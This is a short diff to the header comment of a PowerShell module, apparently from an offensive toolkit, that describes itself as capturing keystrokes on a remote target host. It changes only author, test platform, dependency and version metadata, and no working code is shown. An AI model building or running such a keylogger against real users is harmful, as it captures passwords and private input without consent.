@@ -1,7 +1,12 @@
 ﻿<#
 .SYNOPSIS
-   Author: @r00t-3xp10it
-   Helper - Capture remote host keystrokes {void}
+   Capture remote host keystrokes {void}
+
+   Author: r00t-3xp10it
+   Tested Under: Windows 10 (18363) x64 bits
+   Required Dependencies: none
+   Optional Dependencies: BitsTransfer
+   PS cmdlet Dev version: v1.0.1
 
 .DESCRIPTION
    This module start recording target system keystrokes
